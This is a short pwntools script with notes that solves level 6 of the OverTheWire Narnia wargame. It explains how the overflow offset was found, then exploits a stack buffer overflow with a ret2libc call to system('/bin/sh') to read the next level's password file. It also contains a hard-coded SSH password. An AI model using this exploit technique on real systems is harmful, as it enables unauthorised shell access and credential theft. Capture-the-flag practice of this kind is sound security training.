from pwn import *

"""
local exploit:
    r AAAA $(python -c 'print "B"* 16 + "C"*4' )
It will show you Segmentation Fault.
So the offset for second arg is 16 bytes.
But, when I tried to exploit it with system ret2libc it was not easy to do...
Next, I tried overflow first arg and that's it:
    r $(python -c 'print "A"* * + "B"*4') BBBBCCCC
It also gives a stack overflow. But the binary with NX enabled.
So, there are two way. Ret2libc or ROP.
Ret2libc is easy here.
    p system
Shows you the address of the system
    r $(python -c 'print "A"*8 + "\x50\xc8\xe4\xf7"') CCCCDDDDEEEE
The program will try to execute system('EEEE'). So, you can imagine what you can do with it :)
"""
con = ssh('narnia6', 'narnia.labs.overthewire.org', password='neezocaeng', port=2226)
p = con.process(['/narnia/narnia6', b"A" * 8 + p32(0xf7e4c850), "A" * 8 + "/bin/sh"])
p.sendline('cat /etc/narnia_pass/narnia7')
p.recv()
print(p.recv())
p.close()
con.close()
